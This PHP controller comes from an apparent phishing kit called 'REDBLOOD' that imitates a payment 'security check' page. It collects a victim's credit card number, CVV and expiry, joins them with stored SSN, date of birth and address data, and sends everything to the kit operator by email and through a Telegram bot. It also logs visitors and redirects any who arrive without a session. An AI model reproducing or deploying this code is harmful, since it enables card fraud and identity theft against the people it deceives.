<?php
defined("ALLOW") or exit('No direct script access allowed');

class Payment
{
    public $goRBLD;
    public function __construct()
    {
        $this->goRBLD = new goRBLD();

        if (!isset($_SESSION['access']) and ($_SESSION['access'] != 3)) {

            write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}\r\n");
            write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Access Page Without Session\r\n");
            _blocks();
            redirect(uriRand());
        }
    }

    public function index()
    {
        if ($this->goRBLD->is_mobile) {
            echo view('mobile/payment');
        } else {
            echo view('pc/payment');
        }
    }

    public function process()
    {
        $cardreplace = str_replace(" ", "", $_POST['ccn']);
        if ($_SESSION['ccn'] == $cardreplace) {
            redirect(base_url() . 'security-check/payment/#errorId=' . md5(time()));
        } else if (isset($_POST)) {
            $firstname = $_SESSION['firstname'];
            $lastname = $_SESSION['lastname'];
            $address = $_SESSION['address'];
            $address2 = $_SESSION['address2'];
            $cityP = $_SESSION['cityp'];
            $state = $_SESSION['state'];
            $zipCode = $_SESSION['zip'];
            $dob = $_SESSION['dob'];
            $ssn = $_SESSION['ssn'];
            $phone = $_SESSION['phone'];
            $cardName = $firstname . ' ' . $lastname;
            $cardNumber2 = $_POST['ccn'];
            $cardNumber2 = str_replace(" ", "", $cardNumber2);
            $cardCcv2 = $_POST['cvv'];
            $cardExpM = $_POST['expmonth'];
            $cardExpY = $_POST['expyear'];
            $cardExp = substr($cardExpY, 2);

            $_SESSION['ccn'] = $cardNumber2;
            $bin = look_bin($cardNumber2);

            $message =
                "<fieldset style='border: 3px solid #e4e3e2; border-radius: 20px; max-width: 50%; margin: 0 auto;'>
<pre>
<strong><span style='color: #999999;'>:: REDBLOOD ::</span></strong>

<strong>:: (2) Double Credit or Debit Card ::</strong>
			
# BIN : {$bin}
# Cardholder name : {$cardName}
# Card number 	  : {$cardNumber2}
# Expiration 	  : {$cardExpM}/{$cardExpY}
# Cvv/Cvv2	  : {$cardCcv2}
# Check format 	  : {$cardNumber2}|{$cardExpM}|{$cardExp}|{$cardCcv2}

<strong>:: Personal Information ::</strong>
			
# Address  : {$address}
# Address 2: {$address2}
# City 	   : {$cityP}
# State    : {$state}
# Zip code : {$zipCode}
# Phone    : {$phone}
# SSN 	   : {$ssn}
# DOB	   : {$dob}

<strong>:: Visitor Details ::</strong>

# Date &amp; Time  : " . _date() . "  
# Device       : {$this->goRBLD->platform}
# Browser      : {$this->goRBLD->browser}
# Country      : {$_SESSION['country']}
# State        : {$_SESSION['region']}
# City         : {$_SESSION['city']}
# Ip address   : {$this->goRBLD->ip_address}
# User agent   : {$this->goRBLD->agent}

</pre>
</fieldset>
</pre>";

            $subject = "2 :: {$bin} :: [ {$_SESSION['country']} - {$this->goRBLD->ip_address} ]";
            $headers = 'MIME-Version: 1.0' . "\r\n";
            $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
            $headers .= "From: Card <thief@redblood.com>";
            @mail(_config('RESULT'), $subject, $message, $headers);
            if (_config('TELEGRAM') == 'on') {
				$c = curl_init();
				curl_setopt($c, CURLOPT_URL, 'https://api.telegram.org/bot' . telex('token') . '/sendMessage?chat_id=' . telex('idtelegram') . '&text=' . urlencode(strip_tags($message)));
				curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
				$x = curl_exec($c);
				curl_close($c);
			}

            write(FCPATH . 'REDBLOOD/Static/log_cc.txt', 'a', "{$this->goRBLD->ip_address}\r\n");
            write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Get Card Success #2\r\n");

            $_SESSION['access'] = 4;
            redirect(base_url() . 'security-check/finished/#_dn=' . md5(rand(0, 999)));
        }
    }
}